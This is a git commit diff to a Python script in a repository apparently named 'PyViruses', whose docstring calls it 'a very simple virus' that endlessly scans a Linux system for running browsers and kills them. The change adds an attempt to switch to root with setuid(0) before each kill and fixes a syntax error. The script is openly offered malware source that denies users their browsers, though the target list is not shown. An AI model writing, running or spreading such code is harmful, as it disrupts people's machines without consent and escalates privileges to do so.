056fe0f74ba18e193949aad550895c118bcd5c1c
zeugirdoR sixelA <44281620+binexisHATT@users.noreply.github.com>
2020-10-04 22:32:38 -0400

    Update obstruct_browsing.py

--- PyViruses/BrowserObstruction/obstruct_browsing.py
+++ PyViruses/BrowserObstruction/obstruct_browsing.py
@@ -1,9 +1,9 @@
 #!/usr/bin/env python3
 
-""" A very scans a system for any running browsers and terminates them """
+""" A very simple virus that scans a Linux system for any running browsers and terminates them """
 
 from psutil import process_iter
-from os import kill
+from os import kill, getuid, setuid
 from signal import SIGTERM
 from time import sleep
 
@@ -15,5 +15,6 @@ while True:
   running_processes = {p.pid: p.info['name'] for p in process_iter(["pid", "name"])}
   for pid, p_name in running_processes.items():
     if p_name in target_browser_executables:
+      if getuid() != 0: setuid(0);
       kill(pid, SIGTERM)
-      sleep(10
+      sleep(10)
